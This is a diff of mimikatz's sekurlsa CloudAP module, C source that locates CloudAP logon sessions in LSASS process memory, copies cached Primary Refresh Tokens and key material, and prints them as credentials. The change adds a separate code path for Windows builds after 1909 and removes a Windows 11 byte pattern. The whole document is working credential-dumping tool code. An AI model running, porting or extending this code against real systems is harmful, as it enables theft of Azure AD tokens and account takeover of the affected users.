@@ -1,4 +1,4 @@
-# 1 "project/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_cloudap.c"
+# 1 "/Users/tamofplease/Workspace/research/docker-exp/workspace/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_cloudap.c"
 
 
 
@@ -7,11 +7,9 @@
 #include "kuhl_m_sekurlsa_cloudap.h"
 
 #if defined(_M_X64)
-BYTE PTRN_WALL_CloudApLocateLogonSession[] = {0x44, 0x8b, 0x01, 0x44, 0x39, 0x42, 0x18, 0x75};
-BYTE PTRN_WN11_CloudApLocateLogonSession[] = {0x48, 0x8b, 0xd1, 0x49, 0x3b, 0xc1, 0x75};
+BYTE PTRN_WALL_CloudApLocateLogonSession[] = {0x44, 0x8b, 0x01, 0x44, 0x39, 0x42};
 KULL_M_PATCH_GENERIC CloudApReferences[] = {
  {KULL_M_WIN_BUILD_10_1909, {sizeof(PTRN_WALL_CloudApLocateLogonSession), PTRN_WALL_CloudApLocateLogonSession}, {0, NULL}, {-9}},
- {KULL_M_WIN_MIN_BUILD_11, {sizeof(PTRN_WN11_CloudApLocateLogonSession), PTRN_WN11_CloudApLocateLogonSession}, {0, NULL}, {-4}},
 };
 #elif defined(_M_IX86)
 BYTE PTRN_WALL_CloudApLocateLogonSession[] = {0x8b, 0x31, 0x39, 0x72, 0x10, 0x75};
@@ -32,45 +30,89 @@ NTSTATUS kuhl_m_sekurlsa_cloudap(int argc, wchar_t * argv[])
 
 void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_cloudap(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
 {
- KIWI_CLOUDAP_LOGON_LIST_ENTRY logon;
+
  KIWI_CLOUDAP_CACHE_LIST_ENTRY cache;
  KIWI_CLOUDAP_CACHE_UNK unk;
- KULL_M_MEMORY_ADDRESS aLocalMemory = {&logon, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
+ KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, pData->cLsass->hLsassMem};
  KIWI_GENERIC_PRIMARY_CREDENTIAL creds = {0};
 
- if(kuhl_m_sekurlsa_cloudap_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_cloudap_package.Module, CloudApReferences, ARRAYSIZE(CloudApReferences), (PVOID *) &CloudApGlobalLogonSessionList, NULL, NULL, NULL) )
+ if(kuhl_m_sekurlsa_cloudap_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_cloudap_package.Module, CloudApReferences, ARRAYSIZE(CloudApReferences), (PVOID *) &CloudApGlobalLogonSessionList, NULL, NULL, NULL))
  {
   aLsassMemory.address = CloudApGlobalLogonSessionList;
-  if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_CLOUDAP_LOGON_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
+  if (pData->cLsass->osContext.BuildNumber > KULL_M_WIN_BUILD_10_1909)
   {
-   if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CLOUDAP_LOGON_LIST_ENTRY)))
+   KIWI_CLOUDAP_LOGON_LIST_ENTRY_21H2 logon;
+   KULL_M_MEMORY_ADDRESS aLocalMemory = {&logon, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
+   if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_CLOUDAP_LOGON_LIST_ENTRY_21H2, LocallyUniqueIdentifier), pData->LogonId))
    {
-    if(logon.cacheEntry)
+    if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CLOUDAP_LOGON_LIST_ENTRY_21H2)))
     {
-     aLocalMemory.address = &cache;
-     aLsassMemory.address = logon.cacheEntry;
-     if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CLOUDAP_CACHE_LIST_ENTRY)))
+     if(logon.cacheEntry)
      {
-      kprintf(L"\n\t     Cachedir : %s", cache.toname);
-      if(cache.cbPRT && cache.PRT)
+      aLocalMemory.address = &cache;
+      aLsassMemory.address = logon.cacheEntry;
+      if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CLOUDAP_CACHE_LIST_ENTRY)))
       {
-       creds.UserName.Length = creds.UserName.MaximumLength = (USHORT) cache.cbPRT;
-       creds.UserName.Buffer = (PWSTR) cache.PRT;
-      }
-
-      if(cache.toDetermine)
-      {
-       aLocalMemory.address = &unk;
-       aLsassMemory.address = cache.toDetermine;
-       if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CLOUDAP_CACHE_UNK)))
+       kprintf(L"\n\t     Cachedir : %s", cache.toname);
+       if(cache.cbPRT && cache.PRT)
        {
-        kprintf(L"\n\t     Key GUID : ");
-        kull_m_string_displayGUID(&unk.guid);
-        creds.Password.Length = creds.Password.MaximumLength = (USHORT) unk.unkSize;
-        creds.Password.Buffer = (PWSTR) unk.unk;
+        creds.UserName.Length = creds.UserName.MaximumLength = (USHORT) cache.cbPRT;
+        creds.UserName.Buffer = (PWSTR) cache.PRT;
        }
+
+       if(cache.toDetermine)
+       {
+        aLocalMemory.address = &unk;
+        aLsassMemory.address = cache.toDetermine;
+        if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CLOUDAP_CACHE_UNK)))
+        {
+         kprintf(L"\n\t     Key GUID : ");
+         kull_m_string_displayGUID(&unk.guid);
+         creds.Password.Length = creds.Password.MaximumLength = (USHORT) unk.unkSize;
+         creds.Password.Buffer = (PWSTR) unk.unk;
+        }
+       }
+       kuhl_m_sekurlsa_genericCredsOutput(&creds, pData, KUHL_SEKURLSA_CREDS_DISPLAY_CLOUDAP_PRT);
       }
-      kuhl_m_sekurlsa_genericCredsOutput(&creds, pData, KUHL_SEKURLSA_CREDS_DISPLAY_CLOUDAP_PRT);
+     }
+    }
+   }
+  }
+  else
+  {
+   KIWI_CLOUDAP_LOGON_LIST_ENTRY logon;
+   KULL_M_MEMORY_ADDRESS aLocalMemory = {&logon, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
+   if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_CLOUDAP_LOGON_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
+   {
+    if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CLOUDAP_LOGON_LIST_ENTRY)))
+    {
+     if(logon.cacheEntry)
+     {
+      aLocalMemory.address = &cache;
+      aLsassMemory.address = logon.cacheEntry;
+      if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CLOUDAP_CACHE_LIST_ENTRY)))
+      {
+       kprintf(L"\n\t     Cachedir : %s", cache.toname);
+       if(cache.cbPRT && cache.PRT)
+       {
+        creds.UserName.Length = creds.UserName.MaximumLength = (USHORT) cache.cbPRT;
+        creds.UserName.Buffer = (PWSTR) cache.PRT;
+       }
+
+       if(cache.toDetermine)
+       {
+        aLocalMemory.address = &unk;
+        aLsassMemory.address = cache.toDetermine;
+        if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CLOUDAP_CACHE_UNK)))
+        {
+         kprintf(L"\n\t     Key GUID : ");
+         kull_m_string_displayGUID(&unk.guid);
+         creds.Password.Length = creds.Password.MaximumLength = (USHORT) unk.unkSize;
+         creds.Password.Buffer = (PWSTR) unk.unk;
+        }
+       }
+       kuhl_m_sekurlsa_genericCredsOutput(&creds, pData, KUHL_SEKURLSA_CREDS_DISPLAY_CLOUDAP_PRT);
+      }
      }
     }
    }
